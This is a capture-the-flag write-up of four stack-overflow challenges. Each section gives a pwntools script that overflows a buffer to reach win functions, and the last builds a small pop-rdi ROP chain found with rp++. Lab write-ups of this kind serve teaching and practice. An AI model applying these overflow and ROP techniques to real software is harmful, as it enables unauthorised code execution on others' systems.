## Calling Functions

## Loose Link (Easy)

This was just a classic stack overflow to a control hijack.

![](Attachments/Pasted%20image%2020261026150356.png)

Since PIE isn't enabled on this binary nothing super funky has to go on as there is a built-in win function.

```python
from pwn import *
context.binary = "/challenge/loose-link-easy"
p = context.binary.process()
p.send(b'A' * 0x98 + p64(0x401fca))
print(p.readall().decode('utf-8'))
```

## Loose Link (Hard)

The file has the same makeup of the previous challenge.

![](Attachments/Pasted%20image%2020261026150519.png)

Buffer starts at `0x40` and read is used reading in `0x1000` bytes letting us overflow onto the stack. We can send `0x48` bytes accounting for `RBP` and then the address of the win function. This binary isn't stripped so we see `win` is at `0x401a3b`.

```python
from pwn import *
context.binary = "/challenge/loose-link-hard"
p = context.binary.process()
p.send(b'A' * 0x48 + p64(0x401a3b))
print(p.readall().decode('utf-8'))
```

## Call Chain (Easy)

![](Attachments/Pasted%20image%2020261026150814.png)

This challenge description says this is a two stage win function. Lets see what this means. It seems that the first win function reads the first part of the flag and the second win function reads the other half. So we must call both functions 1 after another.

![](Attachments/Pasted%20image%2020261026151459.png)

![](Attachments/Pasted%20image%2020261026151524.png)

We can write `0x78` bytes to fill the area of the stack to get to the return address.

```python
from pwn import *
context.binary = "/challenge/call-chain-easy"
p = context.binary.process()
p.send(b'A'*0x78 + p64(0x401bc8) + p64(0x401c75))
print(p.readall().decode('utf-8'))
```

## Chain of Command (Easy)

There's 5 win functions in this one. In addition to what has been done previously `edi` needs to be set to the number of the function in the order.

![](Attachments/Pasted%20image%2020261026152740.png)

Knowing `edi` must be set we can look for places to pop `edi/rdi`. I used `rp++` to do this as shown in the modules.

```
rp++ --unique -r2 ./chain-of-command-easy
```

![](Attachments/Pasted%20image%2020261026153244.png)

Perfect with this we can very easily accomplish this.

```python
from pwn import *
context.binary = "/challenge/chain-of-command-easy"
p = context.binary.process()
p.send(
    b'A'*0x58 +
    p64(0x402b63) + p64(0x1) + p64(0x4023ef) +
    p64(0x402b63) + p64(0x2) + p64(0x4025b1) +
    p64(0x402b63) + p64(0x3) + p64(0x402774) +
    p64(0x402b63) + p64(0x4) + p64(0x4024cb) +
    p64(0x402b63) + p64(0x5) + p64(0x402691)
)
print(p.readall().decode('utf-8'))
```
